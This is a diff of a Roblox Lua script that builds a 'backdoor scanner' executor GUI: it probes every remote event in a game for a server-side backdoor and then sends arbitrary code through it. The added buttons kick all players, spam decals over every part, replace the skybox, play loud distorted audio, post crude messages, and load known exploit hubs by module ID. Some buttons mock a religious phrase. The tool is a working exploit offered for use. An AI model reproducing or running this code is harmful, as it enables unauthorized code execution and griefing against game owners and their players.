@@ -5,52 +5,80 @@ local PlayerName = LocalPlayer.Name
 
 local LMG2L = {}
 
-LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
-LMG2L["ScreenGui_1"].Name = "ProjectDxT_Remake"
-LMG2L["ScreenGui_1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-LMG2L["ScreenGui_1"].ResetOnSpawn = false
+LMG2L["Scanner_1"] = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+LMG2L["Scanner_1"].Name = "Scanner"
+LMG2L["Scanner_1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LMG2L["Scanner_1"].ResetOnSpawn = false
 
-LMG2L["Frame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"])
-LMG2L["Frame_2"].BackgroundColor3 = Color3.fromRGB(3, 3, 3)
-LMG2L["Frame_2"].BackgroundTransparency = 0.4
-LMG2L["Frame_2"].Size = UDim2.new(0, 538, 0, 338)
-LMG2L["Frame_2"].Position = UDim2.new(0.5, -269, 0.5, -169)
+LMG2L["Frame_2"] = Instance.new("Frame", LMG2L["Scanner_1"])
 LMG2L["Frame_2"].BorderSizePixel = 0
+LMG2L["Frame_2"].AutoLocalize = false
+LMG2L["Frame_2"].BackgroundColor3 = Color3.fromRGB(3, 3, 3)
+LMG2L["Frame_2"].Size = UDim2.new(0, 538, 0, 338)
+LMG2L["Frame_2"].Position = UDim2.new(0, 190, 0, 6)
 
-LMG2L["UICorner_8"] = Instance.new("UICorner", LMG2L["Frame_2"])
-LMG2L["UIDragDetector_32"] = Instance.new("UIDragDetector", LMG2L["Frame_2"])
+LMG2L["UICorner_2b"] = Instance.new("UICorner", LMG2L["Frame_2"])
+LMG2L["UIDragDetector_3a"] = Instance.new("UIDragDetector", LMG2L["Frame_2"])
 
-LMG2L["TextLabel_2e"] = Instance.new("TextLabel", LMG2L["Frame_2"])
-LMG2L["TextLabel_2e"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-LMG2L["TextLabel_2e"].BackgroundTransparency = 0.4
-LMG2L["TextLabel_2e"].Size = UDim2.new(1, 8, 0, 40)
-LMG2L["TextLabel_2e"].Position = UDim2.new(0, -4, 0, -44)
-LMG2L["TextLabel_2e"].Text = "Project DxT Remake"
-LMG2L["TextLabel_2e"].TextScaled = true
-LMG2L["TextLabel_2e"].FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Bold)
-LMG2L["TextLabel_2e"].TextColor3 = Color3.fromRGB(255, 255, 255)
+LMG2L["TextBox_38"] = Instance.new("TextBox", LMG2L["Frame_2"])
+LMG2L["TextBox_38"].TextXAlignment = Enum.TextXAlignment.Left
+LMG2L["TextBox_38"].BorderSizePixel = 0
+LMG2L["TextBox_38"].TextWrapped = true
+LMG2L["TextBox_38"].TextSize = 15
+LMG2L["TextBox_38"].TextYAlignment = Enum.TextYAlignment.Top
+LMG2L["TextBox_38"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LMG2L["TextBox_38"].FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json")
+LMG2L["TextBox_38"].MultiLine = true
+LMG2L["TextBox_38"].ClearTextOnFocus = false
+LMG2L["TextBox_38"].ClipsDescendants = true
+LMG2L["TextBox_38"].PlaceholderText = "no logger script,no skid🤓✌️🌹🔋"
+LMG2L["TextBox_38"].Size = UDim2.new(0, 524, 0, 198)
+LMG2L["TextBox_38"].Position = UDim2.new(0, 6, 0, 8)
+LMG2L["TextBox_38"].Text = ""
 
-LMG2L["UICorner_2f"] = Instance.new("UICorner", LMG2L["TextLabel_2e"])
+LMG2L["UICorner_39"] = Instance.new("UICorner", LMG2L["TextBox_38"])
 
-LMG2L["TextBox_30"] = Instance.new("TextBox", LMG2L["Frame_2"])
-LMG2L["TextBox_30"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-LMG2L["TextBox_30"].BackgroundTransparency = 0.1
-LMG2L["TextBox_30"].Size = UDim2.new(0, 522, 0, 190)
-LMG2L["TextBox_30"].Position = UDim2.new(0, 8, 0, 16)
-LMG2L["TextBox_30"].Text = ""
-LMG2L["TextBox_30"].PlaceholderText = "by @AltaccountL_8"
-LMG2L["TextBox_30"].TextColor3 = Color3.fromRGB(0, 0, 0)
-LMG2L["TextBox_30"].TextSize = 15
-LMG2L["TextBox_30"].FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json")
-LMG2L["TextBox_30"].TextXAlignment = Enum.TextXAlignment.Left
-LMG2L["TextBox_30"].TextYAlignment = Enum.TextYAlignment.Top
-LMG2L["TextBox_30"].MultiLine = true
-LMG2L["TextBox_30"].ClearTextOnFocus = false
-LMG2L["TextBox_30"].ClipsDescendants = true
+LMG2L["ImageLabel_2c"] = Instance.new("ImageLabel", LMG2L["Frame_2"])
+LMG2L["ImageLabel_2c"].ZIndex = 99
+LMG2L["ImageLabel_2c"].BorderSizePixel = 0
+LMG2L["ImageLabel_2c"].BackgroundTransparency = 1
+LMG2L["ImageLabel_2c"].Image = "rbxassetid://106503800436537"
+LMG2L["ImageLabel_2c"].Size = UDim2.new(0, 530, 0, 200)
+LMG2L["ImageLabel_2c"].Position = UDim2.new(0, 4, 0, 6)
+LMG2L["ImageLabel_2c"].Visible = false
 
-LMG2L["UICorner_31"] = Instance.new("UICorner", LMG2L["TextBox_30"])
+LMG2L["hide txt_2d"] = Instance.new("TextButton", LMG2L["Frame_2"])
+LMG2L["hide txt_2d"].TextWrapped = true
+LMG2L["hide txt_2d"].BorderSizePixel = 0
+LMG2L["hide txt_2d"].TextScaled = true
+LMG2L["hide txt_2d"].TextColor3 = Color3.fromRGB(255, 255, 255)
+LMG2L["hide txt_2d"].BackgroundTransparency = 1
+LMG2L["hide txt_2d"].Size = UDim2.new(0, 102, 0, 60)
+LMG2L["hide txt_2d"].Text = "Hide TxT"
+LMG2L["hide txt_2d"].Name = "hide txt"
+LMG2L["hide txt_2d"].Position = UDim2.new(0, 344, 0, 270)
+LMG2L["hide txt_2d"].FontFace = Font.new("rbxasset://fonts/families/Creepster.json")
 
-local function createButton(name, text, posX, posY, sizeX, sizeY)
+LMG2L["UIStroke_2f"] = Instance.new("UIStroke", LMG2L["hide txt_2d"])
+LMG2L["UIStroke_2f"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+LMG2L["UIStroke_2f"].Color = Color3.fromRGB(255, 255, 255)
+
+LMG2L["hide txt_2d"].MouseButton1Click:Connect(function()
+    LMG2L["ImageLabel_2c"].Visible = not LMG2L["ImageLabel_2c"].Visible
+end)
+
+LMG2L["TextLabel_37"] = Instance.new("TextLabel", LMG2L["Frame_2"])
+LMG2L["TextLabel_37"].TextWrapped = true
+LMG2L["TextLabel_37"].BorderSizePixel = 0
+LMG2L["TextLabel_37"].TextScaled = true
+LMG2L["TextLabel_37"].BackgroundTransparency = 1
+LMG2L["TextLabel_37"].Size = UDim2.new(0, 162, 0, 64)
+LMG2L["TextLabel_37"].Text = "MADE BY UNKNOWN TEAM BEST SCANNER BTW(MYBE)"
+LMG2L["TextLabel_37"].TextColor3 = Color3.fromRGB(255, 255, 255)
+LMG2L["TextLabel_37"].FontFace = Font.new("rbxasset://fonts/families/Creepster.json")
+LMG2L["TextLabel_37"].Position = UDim2.new(0, 180, 0, 270)
+
+local function createBtn(name, text, posX, posY, sizeX, sizeY)
     local btn = Instance.new("TextButton", LMG2L["Frame_2"])
     btn.Name = name
     btn.Text = text
@@ -61,36 +89,154 @@ local function createButton(name, text, posX, posY, sizeX, sizeY)
     btn.TextScaled = true
     btn.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json")
     btn.TextColor3 = Color3.fromRGB(0, 0, 0)
-    
+    btn.BorderSizePixel = 0
+
     local corner = Instance.new("UICorner", btn)
     return btn
 end
 
-LMG2L["Execute_3"] = createButton("Execute", "Execute", 10, 210, 142, 60)
-LMG2L["Clear_5"] = createButton("Clear", "Clear", 158, 208, 110, 62)
-LMG2L["Inject_2a"] = createButton("Inject", "Inject", 274, 210, 124, 60)
-LMG2L["R6_2c"] = createButton("R6", "R6", 404, 210, 118, 58)
-LMG2L["Script hub_33"] = createButton("Script hub", "Script Hub", 390, 282, 142, 48)
+LMG2L["Execute_6"] = createBtn("Execute", "Execute", 10, 210, 144, 60)
+LMG2L["Clear_28"] = createBtn("Clear", "Clear", 158, 212, 118, 56)
+LMG2L["Inject_35"] = createBtn("Inject", "Inject", 280, 214, 120, 52)
+LMG2L["R6_26"] = createBtn("R6", "R6", 402, 216, 56, 48)
+LMG2L["Re_30"] = createBtn("Re", "Re", 462, 218, 60, 44)
+LMG2L["Others_3"] = createBtn("Others", "Others", 8, 274, 86, 60)
+LMG2L["Require Script _32"] = createBtn("Require Script", "Require script", 98, 274, 72, 60)
 
--- Script Hub
-LMG2L["Frame2_9"] = Instance.new("Frame", LMG2L["Frame_2"])
-LMG2L["Frame2_9"].Name = "Frame2"
-LMG2L["Frame2_9"].Visible = false
-LMG2L["Frame2_9"].BackgroundColor3 = Color3.fromRGB(7, 7, 7)
-LMG2L["Frame2_9"].BackgroundTransparency = 0.4
-LMG2L["Frame2_9"].Size = UDim2.new(0, 158, 0, 328)
-LMG2L["Frame2_9"].Position = UDim2.new(1, 8, 0, 8)
+LMG2L["Frame3_8"] = Instance.new("Frame", LMG2L["Frame_2"])
+LMG2L["Frame3_8"].Name = "Frame3"
+LMG2L["Frame3_8"].Visible = false
+LMG2L["Frame3_8"].BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+LMG2L["Frame3_8"].Size = UDim2.new(0, 538, 0, 168)
+LMG2L["Frame3_8"].Position = UDim2.new(0, 0, 0, 340)
 
-LMG2L["UICorner_a"] = Instance.new("UICorner", LMG2L["Frame2_9"])
+LMG2L["UICorner_9"] = Instance.new("UICorner", LMG2L["Frame3_8"])
 
-LMG2L["ScrollingFrame_b"] = Instance.new("ScrollingFrame", LMG2L["Frame2_9"])
-LMG2L["ScrollingFrame_b"].BackgroundTransparency = 0.4
-LMG2L["ScrollingFrame_b"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-LMG2L["ScrollingFrame_b"].Size = UDim2.new(0, 146, 1, -8)
-LMG2L["ScrollingFrame_b"].Position = UDim2.new(0, 6, 0, 4)
-LMG2L["ScrollingFrame_b"].CanvasSize = UDim2.new(0, 0, 0, 1000)
-LMG2L["ScrollingFrame_b"].ScrollBarThickness = 6
+LMG2L["ScrollingFrame_a"] = Instance.new("ScrollingFrame", LMG2L["Frame3_8"])
+LMG2L["ScrollingFrame_a"].BackgroundColor3 = Color3.fromRGB(9, 9, 9)
+LMG2L["ScrollingFrame_a"].Size = UDim2.new(0, 514, 0, 136)
+LMG2L["ScrollingFrame_a"].Position = UDim2.new(0, 14, 0, 10)
+LMG2L["ScrollingFrame_a"].CanvasSize = UDim2.new(0, 0, 0, 300)
+LMG2L["ScrollingFrame_a"].ScrollBarThickness = 12
 
+local function createOtherBtn(name, text, posX, posY, sizeX, sizeY)
+    local btn = Instance.new("TextButton", LMG2L["ScrollingFrame_a"])
+    btn.Name = name
+    btn.Text = text
+    btn.Size = UDim2.new(0, sizeX, 0, sizeY)
+    btn.Position = UDim2.new(0, posX, 0, posY)
+    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    btn.BackgroundTransparency = 0.1
+    btn.TextScaled = true
+    btn.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json")
+
+    local corner = Instance.new("UICorner", btn)
+    return btn
+end
+
+local function createTB(name, placeholder, posX, posY, sizeX, sizeY, default)
+    local tb = Instance.new("TextBox", LMG2L["ScrollingFrame_a"])
+    tb.Name = name
+    tb.PlaceholderText = placeholder
+    tb.Text = default or ""
+    tb.Size = UDim2.new(0, sizeX, 0, sizeY)
+    tb.Position = UDim2.new(0, posX, 0, posY)
+    tb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    tb.BackgroundTransparency = 0.1
+    tb.TextScaled = true
+    tb.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json")
+    tb.ClearTextOnFocus = false
+
+    local corner = Instance.new("UICorner", tb)
+    return tb
+end
+
+LMG2L["Send Hint_10"] = createOtherBtn("Send Hint", "Send Hint", 8, 8, 124, 50)
+LMG2L["Send Message_12"] = createOtherBtn("Send Message", "Send Message", 140, 8, 118, 50)
+LMG2L["Kick all_1f"] = createOtherBtn("Kick all", "Kick all", 266, 10, 114, 48)
+LMG2L["Play Music_1b"] = createOtherBtn("Play Music", "Play Music", 12, 134, 116, 56)
+LMG2L["Stop Music_e"] = createOtherBtn("Stop Music", "Stop Music", 144, 136, 110, 52)
+LMG2L["Play alahuakbar(loud)_15"] = createOtherBtn("Play alahuakbar(loud)", "Play alahuakbar(loud)", 12, 134, 116, 56)
+LMG2L["Play alahuakbar_19"] = createOtherBtn("Play alahuakbar", "Play alahuakbar", 272, 136, 108, 52)
+LMG2L["Decalspam_21"] = createOtherBtn("Decalspam", "Decalspam", 146, 196, 112, 50)
+LMG2L["Skybox_b"] = createOtherBtn("Skybox", "Skybox", 12, 194, 118, 52)
+LMG2L["Destroy Hint_1b"] = createOtherBtn("Destroy Hint", "Destroy Hint", 398, 6, 64, 44)
+LMG2L["Destroy Msg_23"] = createOtherBtn("Destroy Msg", "Destroy Msg", 398, 56, 62, 40)
+
+LMG2L["TextBox hint_14"] = createTB("TextBox hint", "Hint text here", 12, 66, 116, 60, "UNKNOWN TEAM IN HERE")
+LMG2L["TextBox msg_18"] = createTB("TextBox msg", "Send Message", 142, 64, 112, 62, "Cumming")
+LMG2L["TextBox reason_1e"] = createTB("TextBox reason", "Enter Reason..", 270, 64, 108, 62, "SERVER SHUTSHIT")
+LMG2L["TextBox decalspam_d"] = createTB("TextBox decalspam", "Enter Decalspam id", 146, 250, 108, 66, "117002377405975")
+LMG2L["TextBox skybox_17"] = createTB("TextBox skybox", "enter skybox id", 16, 250, 114, 66, "106503800436537")
+
+LMG2L["Frame2_3b"] = Instance.new("Frame", LMG2L["Frame_2"])
+LMG2L["Frame2_3b"].Name = "Frame2"
+LMG2L["Frame2_3b"].Visible = false
+LMG2L["Frame2_3b"].BackgroundColor3 = Color3.fromRGB(7, 7, 7)
+LMG2L["Frame2_3b"].Size = UDim2.new(0, 168, 0, 334)
+LMG2L["Frame2_3b"].Position = UDim2.new(0, 540, 0, 2)
+
+LMG2L["UICorner_3c"] = Instance.new("UICorner", LMG2L["Frame2_3b"])
+
+LMG2L["ScrollingFrame_3d"] = Instance.new("ScrollingFrame", LMG2L["Frame2_3b"])
+LMG2L["ScrollingFrame_3d"].BackgroundTransparency = 0.4
+LMG2L["ScrollingFrame_3d"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+LMG2L["ScrollingFrame_3d"].Size = UDim2.new(0, 146, 0, 326)
+LMG2L["ScrollingFrame_3d"].Position = UDim2.new(0, 12, 0, 2)
+LMG2L["ScrollingFrame_3d"].CanvasSize = UDim2.new(0, 0, 0, 800)
+LMG2L["ScrollingFrame_3d"].ScrollBarThickness = 12
+
+local requireScripts = {
+    {text = "Sugma", pos = 4},
+    {text = "Happy Hub", pos = 58},
+    {text = "Noot Noot", pos = 114},
+    {text = "Anti Skid", pos = 222},
+    {text = "Polaria", pos = 276},
+    {text = "C00lgui", pos = 330},
+    {text = "Primadon", pos = 440},
+    {text = "777ililo", pos = 168},
+    {text = "R7J", pos = 496},
+    {text = "Stummy Gun", pos = 384},
+    {text = "F00plkid", pos = 550},
+    {text = "Fsa", pos = 606},
+    {text = "Brickma", pos = 718},
+    {text = "Dominator", pos = 664},
+}
+
+for _, data in ipairs(requireScripts) do
+    local btn = Instance.new("TextButton", LMG2L["ScrollingFrame_3d"])
+    btn.Text = data.text
+    btn.Size = UDim2.new(0, 122, 0, 50)
+    btn.Position = UDim2.new(0, 4, 0, data.pos)
+    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    btn.BackgroundTransparency = 0.1
+    btn.TextScaled = true
+    btn.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json")
+
+    local corner = Instance.new("UICorner", btn)
+    btn.MouseButton1Click:Connect(function()
+        local scripts = {
+            ["Sugma"] = 'require(11183244198):s("sugma", game.Players["'..PlayerName..'"])',
+            ["Happy Hub"] = 'require(110047253067635):Hload("'..PlayerName..'")',
+            ["Noot Noot"] = 'require(111968558943663):nooties("'..PlayerName..'")',
+            ["Anti Skid"] = 'require(16534611190).AntiSkid("'..PlayerName..'")',
+            ["Polaria"] = 'require(93218599314854).Pload("'..PlayerName..'")',
+            ["C00lgui"] = 'require(14125553864):Fire("'..PlayerName..'", "c00lkidd")',
+            ["Primadon"] = 'require(94673163261524)("'..PlayerName..'")',
+            ["777ililo"] = 'require(134907549394378)("'..PlayerName..'")',
+            ["R7J"] = 'require(0x488847B83D83).TeamR7J("'..PlayerName..'")',
+            ["Stummy Gun"] = 'require(7633712551)("'..PlayerName..'","Guns")',
+            ["F00plkid"] = 'require(0x3ba12f9f1).PLSPL("'..PlayerName..'")',
+            ["Fsa"] = 'require(0x6e9f5acb1a6d).FSA("'..PlayerName..'")',
+            ["Brickma"] = 'require(112945327108627).Brickma("'..PlayerName..'")',
+            ["Dominator"] = 'require(121425622240385).dominantultimate("'..PlayerName..'")',
+        }
+        if scripts[btn.Text] then
+            LMG2L["TextBox_38"].Text = scripts[btn.Text]
+        end
+    end)
+end
+-- Logic nya wok
 local backdoorRemote = nil
 
 local alphabet = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
@@ -98,9 +244,7 @@ local alphabet = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p
 
 local function randomName(len)
     local s = ""
-    for i = 1, len do
-        s = s .. alphabet[math.random(#alphabet)]
-    end
+    for i = 1, len do s = s .. alphabet[math.random(#alphabet)] end
     return s
 end
 
@@ -108,9 +252,7 @@ local function fire(remote, code)
     if remote:IsA("RemoteEvent") then
         remote:FireServer(code)
     elseif remote:IsA("RemoteFunction") then
-        task.spawn(function()
-            remote:InvokeServer(code)
-        end)
+        task.spawn(function() remote:InvokeServer(code) end)
     end
 end
 
@@ -127,27 +269,25 @@ end
 
 local function scan()
     if backdoorRemote then
-        LMG2L["Inject_2a"].Text = "Injected"
+        LMG2L["Inject_35"].Text = "Injected!"
         return
     end
 
-    LMG2L["Inject_2a"].Text = "Scanning..."
+    LMG2L["Inject_35"].Text = "Scanning..."
     local startTime = tick()
 
     local remotes = {}
     for _, obj in ipairs(game:GetDescendants()) do
         if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not isSkipped(obj) then
             local uniqueCode = randomName(math.random(20, 30))
-            while remotes[uniqueCode] do
-                uniqueCode = randomName(math.random(20, 30))
-            end
+            while remotes[uniqueCode] do uniqueCode = randomName(math.random(20, 30)) end
             remotes[uniqueCode] = obj
             fire(obj, [[Instance.new("Model", workspace).Name = "]] .. uniqueCode .. [["]])
         end
     end
 
     local checks = 0
-    while checks < 80 do  -- max ~8 detik check
+    while checks < 80 do
         task.wait(0.1)
         checks = checks + 1
 
@@ -158,94 +298,192 @@ local function scan()
 
                 pcall(function()
                     StarterGui:SetCore("SendNotification", {
-                        Title = "Backdoor Found!",
+                        Title = "Inject Success",
                         Text = "Time: " .. timeTaken .. "s",
-                        Duration = 8,
-                        Icon = "rbxassetid://130835138658335"
+                        Duration = 8
                     })
                 end)
 
-                local testModel = workspace:FindFirstChild(code)
-                if testModel then testModel:Destroy() end
+                if workspace:FindFirstChild(code) then workspace[code]:Destroy() end
 
-                LMG2L["Inject_2a"].Text = "Injected!"
+                LMG2L["Inject_35"].Text = "Injected"
                 return
             end
         end
     end
 
-    LMG2L["Inject_2a"].Text = "Failed to inject"
+    LMG2L["Inject_35"].Text = "Failed to inject:("
 end
 
-LMG2L["Execute_3"].MouseButton1Click:Connect(function()
-    local code = LMG2L["TextBox_30"].Text
-    if code:gsub("%s", "") == "" or not backdoorRemote then return end
-    fire(backdoorRemote, code)
-end)
-
-LMG2L["Clear_5"].MouseButton1Click:Connect(function()
-    LMG2L["TextBox_30"].Text = ""
-end)
-
-LMG2L["Inject_2a"].MouseButton1Click:Connect(scan)
-
-LMG2L["Script hub_33"].MouseButton1Click:Connect(function()
-    LMG2L["Frame2_9"].Visible = not LMG2L["Frame2_9"].Visible
-end)
-
-LMG2L["R6_2c"].MouseButton1Click:Connect(function()
+local function executeScript(code)
     if not backdoorRemote then
-        warn("Inject First!")
+        warn("Inject dulu bro!")
         return
     end
-    fire(backdoorRemote, 'require(9635947635).load("'..PlayerName..'")')
-end)
-
-local scripts = {
-    {text = "Hint", script = [[local hint = Instance.new("Hint") hint.Text = "hint.TxT" hint.Parent = workspace
-task.delay(3, function() hint:Destroy() end)]]},
-    {text = "Msg", script = [[local msg = Instance.new("Message") msg.Text = "MSG.TxT" msg.Parent = workspace
-task.delay(3, function() msg:Destroy() end)]]},
-    {text = "Kick all", script = [[local Players = game:GetService("Players")
-for _, plr in ipairs(Players:GetPlayers()) do plr:Kick("Server Shutdowned LoL\nError Code: 267") 
-end]]},
-    {text = "Happy Hub", script = 'require(110047253067635):Hload("'..PlayerName..'")'},
-    {text = "Sugma", script = 'require(11183244198):s("sugma", game.Players["'..PlayerName..'"])'},
-    {text = "Noot Noot", script = 'require(111968558943663):nooties("'..PlayerName..'")'},
-    {text = "Stop All Music", script = [[for _, v in ipairs(game:GetDescendants()) do if v:IsA("Sound") then v:Stop() end end]]},
-    {text = "Play Music", script = [[local DxT = Instance.new("Sound") 
-DxT.Name = "DxT" DxT.SoundId = "rbxassetid://80262129864562" 
-DxT.Volume = 67 
-DxT.Looped = true
-DxT.PlaybackSpeed = 0.1 
-DxT.Parent = workspace 
-local distort = Instance.new("DistortionSoundEffect") 
-distort.Level = 99 distort.Parent = DxT 
-DxT:Play()]]},
-    {text = "777ililo", script = 'require(134907549394378)("'..PlayerName..'")'},
-    {text = "AntiSkid", script = 'require(16534611190).AntiSkid("'..PlayerName..'")'},
-    {text = "Polaria", script = 'require(93218599314854).Pload("'..PlayerName..'")'},
-    {text = "c00lgui", script = 'require(14125553864):Fire("'..PlayerName..'", "c00lkidd")'},
-    {text = "Primadon", script = 'require(94673163261524)("'..PlayerName..'")'},
-    {text = "R7J", script = 'require(0x488847B83D83).TeamR7J("'..PlayerName..'")'},
-    {text = "Stummy Gun", script = 'require(7633712551)("'..PlayerName..'","Guns")'},
-}
-
-for i, data in ipairs(scripts) do
-    local btn = Instance.new("TextButton", LMG2L["ScrollingFrame_b"])
-    btn.Text = data.text
-    btn.Size = UDim2.new(0, 122, 0, 50)
-    btn.Position = UDim2.new(0, 2, 0, (i-1)*54)
-    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    btn.BackgroundTransparency = 0.1
-    btn.TextScaled = true
-    btn.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json")
-    
-    local corner = Instance.new("UICorner", btn)
-    
-    btn.MouseButton1Click:Connect(function()
-        LMG2L["TextBox_30"].Text = data.script
-    end)
+    fire(backdoorRemote, code)
 end
 
-LMG2L["TextBox_30"].Text = 'Print("Welcome To Project DxT remake | by ZACH රධ<-- my dih btw")'
+LMG2L["Execute_6"].MouseButton1Click:Connect(function()
+    local cmd = LMG2L["TextBox_38"].Text
+    if cmd:gsub("%s","") == "" then return end
+    executeScript(cmd)
+end)
+
+LMG2L["Clear_28"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_38"].Text = ""
+end)
+
+LMG2L["Inject_35"].MouseButton1Click:Connect(scan)
+
+LMG2L["Others_3"].MouseButton1Click:Connect(function()
+    LMG2L["Frame3_8"].Visible = not LMG2L["Frame3_8"].Visible
+end)
+
+LMG2L["Require Script _32"].MouseButton1Click:Connect(function()
+    LMG2L["Frame2_3b"].Visible = not LMG2L["Frame2_3b"].Visible
+end)
+
+-- Skybox
+LMG2L["Skybox_b"].MouseButton1Click:Connect(function()
+    local skyId = LMG2L["TextBox skybox_17"].Text
+    if skyId == "" then skyId = "106503800436537" end
+    executeScript([[
+local Lighting = game:GetService("Lighting")
+local sky = Instance.new("Sky")
+sky.Name = "SKIDhack"
+
+sky.SkyboxBk = "rbxassetid://]]..skyId..[["
+sky.SkyboxFt = "rbxassetid://]]..skyId..[["
+sky.SkyboxLf = "rbxassetid://]]..skyId..[["
+sky.SkyboxRt = "rbxassetid://]]..skyId..[["
+sky.SkyboxUp = "rbxassetid://]]..skyId..[["
+sky.SkyboxDn = "rbxassetid://]]..skyId..[["
+sky.Parent = Lighting
+]])
+end)
+
+-- Decalspam
+LMG2L["Decalspam_21"].MouseButton1Click:Connect(function()
+    local decalId = LMG2L["TextBox decalspam_d"].Text
+    if decalId == "" then decalId = "117002377405975" end
+    executeScript([[
+for _,part in ipairs(workspace:GetDescendants()) do
+    if part:IsA("BasePart") then
+        for _,d in ipairs(part:GetChildren()) do
+            if d:IsA("Decal") then d:Destroy() end
+        end
+        for _,face in ipairs(Enum.NormalId:GetEnumItems()) do
+            local decal = Instance.new("Decal")
+            decal.Texture = "rbxassetid://]]..decalId..[["
+            decal.Face = face
+            decal.Parent = part
+        end
+    end
+end
+]])
+end)
+
+-- Send Hint
+LMG2L["Send Hint_10"].MouseButton1Click:Connect(function()
+    local text = LMG2L["TextBox hint_14"].Text
+    if text == "" then text = "UNKNOWN TEAM IN HERE" end
+    executeScript('local h=Instance.new("Hint") h.Text="'..text..'" h.Parent=workspace')
+end)
+
+-- Send Message
+LMG2L["Send Message_12"].MouseButton1Click:Connect(function()
+    local text = LMG2L["TextBox msg_18"].Text
+    if text == "" then text = "Cumming" end
+    executeScript('local m=Instance.new("Message") m.Text="'..text..'" m.Parent=workspace task.delay(5,function() m:Destroy() end)')
+end)
+
+-- Kick all
+LMG2L["Kick all_1f"].MouseButton1Click:Connect(function()
+    local reason = LMG2L["TextBox reason_1e"].Text
+    if reason == "" then reason = "SERVER SHUTSHIT" end
+    executeScript('for _,p in ipairs(game.Players:GetPlayers()) do p:Kick("'..reason..'") end')
+end)
+
+-- Destroy Hint
+LMG2L["Destroy Hint_1b"].MouseButton1Click:Connect(function()
+    executeScript([[for _,obj in ipairs(workspace:GetDescendants()) do if obj:IsA("Hint") then obj:Destroy() end end]])
+end)
+
+-- Destroy Msg
+LMG2L["Destroy Msg_23"].MouseButton1Click:Connect(function()
+    executeScript([[for _,obj in ipairs(workspace:GetDescendants()) do if obj:IsA("Message") then obj:Destroy() end end]])
+end)
+
+-- Stop Music
+LMG2L["Stop Music_e"].MouseButton1Click:Connect(function()
+    executeScript([[for _,obj in ipairs(game:GetDescendants()) do if obj:IsA("Sound") then obj:Stop() end end]])
+end)
+
+-- Play alahuakbar
+LMG2L["Play alahuakbar_19"].MouseButton1Click:Connect(function()
+    executeScript([[
+local SoundService = game:GetService("SoundService")
+
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://85390427326662"
+sound.Volume = 6
+sound.PlaybackSpeed = 0.1
+sound.Looped = false
+sound.Parent = SoundService
+
+local pitch = Instance.new("PitchShiftSoundEffect")
+pitch.Octave = 1.3
+pitch.Parent = sound
+
+sound:Play()
+]])
+end)
+
+-- Play alahuakbar(loud)
+LMG2L["Play alahuakbar(loud)_15"].MouseButton1Click:Connect(function()
+    executeScript([[
+local SoundService = game:GetService("SoundService")
+
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://85390427326662"
+sound.Volume = 10
+sound.PlaybackSpeed = 0.1
+sound.Looped = false
+sound.Parent = SoundService
+
+local distort = Instance.new("DistortionSoundEffect")
+distort.Level = 1
+distort.Parent = sound
+
+sound:Play()
+]])
+end)
+
+-- Play Music
+LMG2L["Play Music_1b"].MouseButton1Click:Connect(function()
+    executeScript([[
+local A = Instance.new("Sound")
+A.Name = "Audio"
+A.SoundId = "rbxassetid://85390427326662"
+A.Volume = 10
+A.Looped = true
+A.PlaybackSpeed = 0.1
+A.Parent = workspace
+
+local distort = Instance.new("DistortionSoundEffect")
+distort.Level = 1
+distort.Parent = A
+
+A:Play()
+]])
+end)
+
+-- R6
+LMG2L["R6_26"].MouseButton1Click:Connect(function()
+    executeScript('require(9635947635).load("'..PlayerName..'")')
+end)
+
+-- Re 
+LMG2L["Re_30"].MouseButton1Click:Connect(function()
+    executeScript('require(3229910984):respawn("'..PlayerName..'")')
+end)
